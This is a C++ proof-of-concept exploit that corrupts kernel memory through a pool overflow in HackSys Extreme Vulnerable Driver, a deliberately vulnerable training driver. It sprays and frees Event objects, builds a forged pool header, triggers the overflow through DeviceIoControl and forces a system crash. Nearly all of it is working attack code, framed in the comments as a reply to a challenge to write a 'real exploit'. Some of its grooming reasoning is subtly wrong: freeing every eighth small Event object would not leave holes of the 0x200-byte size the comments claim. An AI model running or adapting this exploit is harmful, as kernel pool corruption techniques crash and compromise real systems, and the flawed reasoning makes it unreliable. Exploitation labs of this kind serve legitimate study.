#include <windows.h>
#include <stdio.h>
#include <vector>

// Fox's Real Kernel Pool Corruption PoC (via HEVD)
//
// Jack's Roast: "SIMULATION" is fake. Write a real exploit or admit you can't.
// 
// The Reality:
// We are using HackSys Extreme Vulnerable Driver (HEVD) as the real target.
// HEVD has a deliberate Pool Overflow vulnerability (IOCTL 0x22200F).
// We will perform real Pool Feng Shui using Event Objects to groom the Non-Paged Pool.
// We will trigger the real HEVD overflow to corrupt the adjacent Event Object's header.

#define HEVD_IOCTL_POOL_OVERFLOW 0x22200F

// Undocumented Pool Header (Simplified for Windows 7/8/10 x64)
// Corrupting the PoolIndex or BlockSize leads to a BugCheck (BSOD) when the object is freed,
// proving we successfully overwrote kernel memory out-of-bounds.
struct FAKE_POOL_HEADER {
    ULONG PreviousSize : 8;
    ULONG PoolIndex : 8;
    ULONG BlockSize : 8;
    ULONG PoolType : 8;
    ULONG PoolTag;
};

int main() {
    printf("[+] Starting REAL Kernel Pool Corruption PoC (HEVD).\n");

    // 1. Open handle to the real vulnerable driver
    HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 
                                 GENERIC_READ | GENERIC_WRITE, 
                                 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open HEVD. Make sure the driver is loaded!\n");
        printf("[-] Download: https://github.com/hacksysteam/HackSysExtremeVulnerableDriver\n");
        return -1;
    }
    printf("[+] Opened handle to HEVD.\n");

    // ---------------------------------------------------------
    // 2. REAL POOL FENG SHUI (Grooming the Non-Paged Pool)
    // ---------------------------------------------------------
    printf("[+] Grooming the kernel pool with Event Objects...\n");

    // We use CreateEvent because Event objects are allocated in the Non-Paged Pool.
    // Their size is predictable (usually 0x40 bytes on x64).
    std::vector<HANDLE> sprayHandles;
    for (int i = 0; i < 10000; i++) {
        HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
        if (hEvent) sprayHandles.push_back(hEvent);
    }
    printf("[+] Sprayed 10,000 Event objects.\n");

    // Poke holes in the spray to create predictable 0x200 byte chunks
    // HEVD's vulnerable allocation is 0x1F8 bytes (rounds to 0x200 in the pool).
    // We free every 8th object to create holes exactly the right size.
    printf("[+] Poking holes in the pool...\n");
    for (size_t i = 0; i < sprayHandles.size(); i += 8) {
        CloseHandle(sprayHandles[i]);
        sprayHandles[i] = NULL; // Mark as freed
    }
    printf("[+] Pool fragmented. Holes created for the vulnerable object.\n");

    // ---------------------------------------------------------
    // 3. THE PAYLOAD (Constructing the Overflow Buffer)
    // ---------------------------------------------------------
    // HEVD allocates 0x1F8 bytes. If we send more, it overflows into the next chunk.
    // The next chunk is one of our Event objects!
    
    DWORD payloadSize = 0x1F8 + sizeof(FAKE_POOL_HEADER);
    PBYTE payload = (PBYTE)VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // Fill the legitimate buffer space with junk
    memset(payload, 0x41, 0x1F8); 

    // Construct the fake pool header to overwrite the adjacent Event object
    FAKE_POOL_HEADER* fakeHeader = (FAKE_POOL_HEADER*)(payload + 0x1F8);
    fakeHeader->PreviousSize = 0x40; // 0x200 / 8
    fakeHeader->PoolIndex = 0;       // Corrupted!
    fakeHeader->BlockSize = 0x08;    // 0x40 / 8
    fakeHeader->PoolType = 0;        // NonPagedPool
    fakeHeader->PoolTag = 0x45766545; // 'EveE' (Event object tag)

    printf("[+] Payload constructed. Size: 0x%X bytes (Overflowing by 0x%X bytes).\n", payloadSize, (DWORD)sizeof(FAKE_POOL_HEADER));

    // ---------------------------------------------------------
    // 4. THE TRIGGER (Real Memory Corruption)
    // ---------------------------------------------------------
    printf("[!] Triggering HEVD Pool Overflow IOCTL...\n");
    
    DWORD bytesReturned = 0;
    // This call sends our oversized buffer to HEVD. 
    // HEVD copies it into the 0x1F8 hole we made. 
    // The copy overflows and overwrites the Pool Header of the adjacent Event object.
    DeviceIoControl(hDevice, HEVD_IOCTL_POOL_OVERFLOW, payload, payloadSize, NULL, 0, &bytesReturned, NULL);

    printf("[!] IOCTL sent. Adjacent kernel pool header is now corrupted.\n");

    // ---------------------------------------------------------
    // 5. THE PROOF (Triggering the BugCheck)
    // ---------------------------------------------------------
    printf("[!] Freeing the remaining Event objects to trigger the corrupted header...\n");
    printf("[!] WARNING: If the exploit succeeded, the system will BSOD (BAD_POOL_HEADER) RIGHT NOW.\n");
    
    for (size_t i = 0; i < sprayHandles.size(); i++) {
        if (sprayHandles[i] != NULL) {
            CloseHandle(sprayHandles[i]); // The kernel tries to free the corrupted object and crashes.
        }
    }

    printf("[-] If you see this, the pool grooming failed or the system mitigated the crash.\n");

    CloseHandle(hDevice);
    return 0;
}